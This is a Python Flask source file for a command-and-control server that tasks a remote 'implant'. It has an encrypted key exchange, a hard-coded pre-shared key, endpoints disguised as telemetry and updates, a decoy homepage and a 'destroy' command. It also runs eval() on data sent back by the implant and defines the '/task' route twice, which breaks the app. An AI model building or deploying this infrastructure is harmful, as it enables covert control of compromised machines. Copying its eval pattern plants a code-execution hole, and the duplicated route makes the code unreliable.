"""Command and Control HTTP server for communicating with implant"""

# TODO: change eval to json

import base64
import os
import json
from time import time
from flask import Flask, request, jsonify
from werkzeug.utils import secure_filename
from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import serialization

app = Flask(__name__)
tasks = []
results = []
HOST = "127.0.0.1"
PORT = 8443
BEACON_ENDPOINT = "/api/telemetry"
RESULTS_ENDPOINT = "/api/updates"
FILE_ENDPOINT = "/api/upload"
UPLOAD_FOLDER = "uploads"
derived_key = None


def encrypt_data(aes_key: bytes, plaintext: str | bytes) -> bytes:
    """Encrypt data using AES-256-GCM with nonce and encode with base64"""
    if isinstance(plaintext, str):
        plaintext = plaintext.encode()

    aesgcm = AESGCM(aes_key)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    return base64.b64encode(nonce + ciphertext)


def decrypt_data(aes_key: bytes, b64_data: bytes, decode: bool = True):
    """Decrypt data using AES-256-GCM with nonce and decode with base64"""
    data = base64.b64decode(b64_data)
    nonce = data[:12]
    ciphertext_and_tag = data[12:]

    aesgcm = AESGCM(aes_key)
    plaintext = aesgcm.decrypt(nonce, ciphertext_and_tag, None)
    return plaintext if not decode else plaintext.decode("utf-8")


def exchange_keys(client_public_bytes: bytes) -> bytes:
    """
    X25519 key exchange protocol:

    1.  On start, client generates key pair and sends public key in first beacon to server
    2.  Server generates key pair and responds to client with its public key
    3.  Both client and server derive shared secret AES key and use it for following communications
    -   These packets are encrypted with pre-shared key
    -   If client can't connect to server, it will keep retrying with new key pairs
    """
    print("[*] First beacon received from client, exchanging keys...")
    # get client public key
    client_public_key = x25519.X25519PublicKey.from_public_bytes(client_public_bytes)

    # generate X25519 keypair
    server_private_key = x25519.X25519PrivateKey.generate()
    server_public_key = server_private_key.public_key()

    # send public key bytes to client
    server_public_bytes = server_public_key.public_bytes(
        encoding=serialization.Encoding.Raw, format=serialization.PublicFormat.Raw
    )

    # compute shared secret
    shared_secret = server_private_key.exchange(client_public_key)

    # derive AES key using HKDF
    shared_key = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b"handshake data",
    ).derive(shared_secret)

    return shared_key, server_public_bytes


@app.route(BEACON_ENDPOINT, methods=["POST"])
def beacon():
    """
    When implant requests this endpoint with no data, send its tasks
    If receiving client's first beacon with its public key, send server's public key
    """
    # client's first beacon with public key
    if request.data:
        pre_shared_key = b"]T\xb8\x9e\xc4*}F\x01\xa7\xa30P-Y\xb1\x87W\x07\xe9\xe3\x81\x95r\x11v\n\xf498=\x9f"
        enc = request.get_data()
        client_public_bytes = decrypt_data(pre_shared_key, enc, False)
        global derived_key
        derived_key, server_public_bytes = exchange_keys(client_public_bytes)

        # send server public bytes, then send tasks on the next beacon
        return encrypt_data(pre_shared_key, server_public_bytes)

    # else send task
    json_str = json.dumps({"tasks": tasks})
    response = encrypt_data(derived_key, json_str.encode("utf-8"))
    # clear after sending
    tasks.clear()
    return response


@app.route("/task", methods=["POST"])
def task():
    # operator calls this endpoint with "cmd" (str) param to add task
    # implant receives tasks when pinging BEACON_ENDPOINT
    data = request.json
    print("[*] TASKS\n", data)
    command: str = data.get("cmd")

    tasks.append(command)
    return jsonify({"status": "task added"})


@app.route(RESULTS_ENDPOINT, methods=["POST"])
def task_result():
    # implant uses this endpoint to upload results of tasks
    enc = request.get_data().decode()
    plain = decrypt_data(derived_key, enc)
    print("[*] RESULT\n", plain)
    json_data = eval(plain)

    output = json_data.get("result")
    results.append(output)
    return encrypt_data(derived_key, "ok")


@app.route("/task", methods=["POST"])
def task():
    # operator calls this endpoint with "cmd" param to add task
    data = request.json
    print("DATA\n", data)
    command = data.get("cmd")

    tasks.append(command)
    return jsonify({"status": "task added"})


@app.route("/destroy", methods=["POST"])
def destroy():
    # operator calls this to replace all tasks with final "destroy" task
    tasks.clear()
    tasks.append("DESTROY")
    return jsonify({"status": "sent destroy task"})


@app.route("/view")
def view_results():
    # operator calls this endpoint to view results
    return jsonify(results)


@app.route("/")
def show_homepage():
    return "totally legitimate app, nothing to see here\n"


if __name__ == "__main__":
    context = ("cert/server.crt", "cert/server.key")
    app.run(host=HOST, port=PORT, ssl_context=context)
